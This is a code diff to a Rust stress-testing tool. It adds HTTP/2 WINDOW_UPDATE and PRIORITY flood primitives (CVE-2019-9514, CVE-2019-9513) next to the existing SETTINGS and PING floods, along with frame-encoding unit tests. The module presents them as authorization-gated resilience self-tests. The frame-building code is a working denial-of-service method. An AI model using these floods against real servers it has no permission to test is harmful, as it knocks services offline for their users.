@@ -1,7 +1,8 @@
-//! # HTTP/2 control-frame floods (SETTINGS / PING) — isolated-lab / authorized use.
+//! # HTTP/2 control-frame floods (SETTINGS / PING / WINDOW_UPDATE / PRIORITY) —
+//! isolated-lab / authorized use.
 //!
-//! Both primitives open an HTTP/2 connection and then flood a **connection-level
-//! control frame** that obliges the server to do work per frame, cheaply, forever:
+//! Each primitive opens an HTTP/2 connection and then floods a **control frame**
+//! that obliges the server to do work per frame, cheaply, forever:
 //!
 //!   - **SETTINGS flood** (CVE-2019-9515) — a stream of empty `SETTINGS` frames.
 //!     Each non-ACK `SETTINGS` frame the server receives must be applied and
@@ -10,11 +11,18 @@
 //!   - **PING flood** (CVE-2019-9512) — a stream of `PING` frames. Each `PING`
 //!     obliges the server to reply with a `PING` ACK (PONG), again turning one
 //!     cheap client frame into guaranteed server work + egress.
+//!   - **WINDOW_UPDATE flood** (CVE-2019-9514) — a stream of connection-level
+//!     `WINDOW_UPDATE` frames (stream 0). Each obliges the server to process a
+//!     flow-control credit update; the increment is a fixed, valid non-zero value
+//!     so the connection is never torn down for a protocol error.
+//!   - **PRIORITY flood** (CVE-2019-9513, "Resource Loop") — a stream of
+//!     `PRIORITY` frames. Each reshuffles the server's priority tree, work it must
+//!     do even though no request stream is ever opened.
 //!
-//! Neither uses a request stream, so there is no flow-control credit to exhaust
-//! and no stream state to manage — the asymmetry is pure per-frame bookkeeping.
-//! jinrai exposes them as resilience self-tests so an operator can measure whether
-//! their own stack bounds / rate-limits unsolicited control frames.
+//! None of them uses a request stream, so there is no flow-control credit to
+//! exhaust and no stream state to manage — the asymmetry is pure per-frame
+//! bookkeeping. jinrai exposes them as resilience self-tests so an operator can
+//! measure whether their own stack bounds / rate-limits unsolicited control frames.
 //!
 //! ## Why raw frames
 //!
@@ -45,16 +53,24 @@ use tokio_rustls::TlsConnector;
 use jinrai_core::{Layer, RunPlan, RunReport, StressModule};
 use jinrai_safety::{Authorization, AuthorizedTarget, KillSwitch};
 
-use crate::h2_frames::{push_frame, FLAG_NONE, PREFACE, TYPE_PING, TYPE_SETTINGS};
+use crate::h2_frames::{
+    push_frame, FLAG_NONE, PREFACE, TYPE_PING, TYPE_PRIORITY, TYPE_SETTINGS, TYPE_WINDOW_UPDATE,
+};
 use crate::{authorize_datum, resolve_addrs, wait_for_kill, L7Error};
 
-/// Which connection-level control frame to flood.
+/// Which control frame to flood.
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub enum H2FrameKind {
     /// Empty `SETTINGS` frames (CVE-2019-9515) — server must apply + ACK each.
     Settings,
     /// `PING` frames (CVE-2019-9512) — server must reply with a PING ACK each.
     Ping,
+    /// Connection-level `WINDOW_UPDATE` frames (CVE-2019-9514) — server must
+    /// process a flow-control credit update per frame.
+    WindowUpdate,
+    /// `PRIORITY` frames (CVE-2019-9513) — server must reshuffle its priority
+    /// tree per frame ("Resource Loop").
+    Priority,
 }
 
 impl H2FrameKind {
@@ -62,18 +78,38 @@ impl H2FrameKind {
         match self {
             H2FrameKind::Settings => "l7-h2-settings-flood",
             H2FrameKind::Ping => "l7-h2-ping-flood",
+            H2FrameKind::WindowUpdate => "l7-h2-window-update-flood",
+            H2FrameKind::Priority => "l7-h2-priority-flood",
         }
     }
 
-    /// The already-encoded flood frame for this kind: an empty SETTINGS frame, or
-    /// a PING frame with an 8-octet opaque payload (RFC 7540 requires PING to be
-    /// exactly 8 bytes). Both are sent on stream 0 with no flags (so not an ACK),
-    /// which is what obliges the server to answer.
+    /// The already-encoded flood frame for this kind:
+    ///   - `SETTINGS`: an empty frame on stream 0.
+    ///   - `PING`: an 8-octet opaque payload on stream 0 (RFC 7540 requires PING
+    ///     to be exactly 8 bytes).
+    ///   - `WINDOW_UPDATE`: a 4-octet window-size increment on stream 0. The
+    ///     increment is 1 — a valid, non-zero value (a 0 increment is a protocol
+    ///     error that would close the connection), the smallest that still obliges
+    ///     the server to process a credit update per frame.
+    ///   - `PRIORITY`: a 5-octet payload (4-octet stream dependency + 1-octet
+    ///     weight) on stream 1. PRIORITY frames are not allowed on stream 0, so a
+    ///     non-zero stream id is required; the frame makes stream 1 depend on the
+    ///     connection root (dependency 0) with the minimum weight.
+    ///
+    /// SETTINGS/PING/WINDOW_UPDATE carry no flags (so no ACK), which is what
+    /// obliges the server to act on each frame.
     fn frame(self) -> Vec<u8> {
         let mut f = Vec::with_capacity(9 + 8);
         match self {
             H2FrameKind::Settings => push_frame(&mut f, TYPE_SETTINGS, FLAG_NONE, 0, &[]),
             H2FrameKind::Ping => push_frame(&mut f, TYPE_PING, FLAG_NONE, 0, &[0u8; 8]),
+            H2FrameKind::WindowUpdate => {
+                push_frame(&mut f, TYPE_WINDOW_UPDATE, FLAG_NONE, 0, &1u32.to_be_bytes())
+            }
+            H2FrameKind::Priority => {
+                // stream dependency (4 bytes, root = 0) + weight (1 byte, 0 => 1).
+                push_frame(&mut f, TYPE_PRIORITY, FLAG_NONE, 1, &[0, 0, 0, 0, 0])
+            }
         }
         f
     }
@@ -302,6 +338,11 @@ mod tests {
         assert_eq!(ping.name(), "l7-h2-ping-flood");
         assert_eq!(settings.name(), "l7-h2-settings-flood");
         assert_eq!(ping.layer(), Layer::L7);
+
+        let win = H2FrameFloodEngine::new(gate_cidrs(&["127.0.0.0/8"]), "http://127.0.0.1:9/", H2FrameKind::WindowUpdate);
+        let prio = H2FrameFloodEngine::new(gate_cidrs(&["127.0.0.0/8"]), "http://127.0.0.1:9/", H2FrameKind::Priority);
+        assert_eq!(win.name(), "l7-h2-window-update-flood");
+        assert_eq!(prio.name(), "l7-h2-priority-flood");
     }
 
     #[test]
@@ -322,6 +363,27 @@ mod tests {
         assert_eq!(f[4], 0x0, "no ACK flag");
         assert_eq!(&f[5..9], &[0, 0, 0, 0], "stream 0");
         assert_eq!(f.len(), 9);
+    }
+
+    #[test]
+    fn window_update_frame_is_type_8_len_4_nonzero_increment_on_stream_0() {
+        let f = H2FrameKind::WindowUpdate.frame();
+        assert_eq!(&f[0..3], &[0, 0, 4], "WINDOW_UPDATE payload must be 4 bytes");
+        assert_eq!(f[3], 0x8, "type WINDOW_UPDATE");
+        assert_eq!(f[4], 0x0, "no flags");
+        assert_eq!(&f[5..9], &[0, 0, 0, 0], "connection-level, stream 0");
+        assert_ne!(&f[9..13], &[0, 0, 0, 0], "increment must be non-zero (0 is a protocol error)");
+        assert_eq!(f.len(), 9 + 4);
+    }
+
+    #[test]
+    fn priority_frame_is_type_2_len_5_on_a_nonzero_stream() {
+        let f = H2FrameKind::Priority.frame();
+        assert_eq!(&f[0..3], &[0, 0, 5], "PRIORITY payload must be 5 bytes");
+        assert_eq!(f[3], 0x2, "type PRIORITY");
+        assert_eq!(f[4], 0x0, "no flags");
+        assert_ne!(&f[5..9], &[0, 0, 0, 0], "PRIORITY is illegal on stream 0");
+        assert_eq!(f.len(), 9 + 5);
     }
 
     #[test]
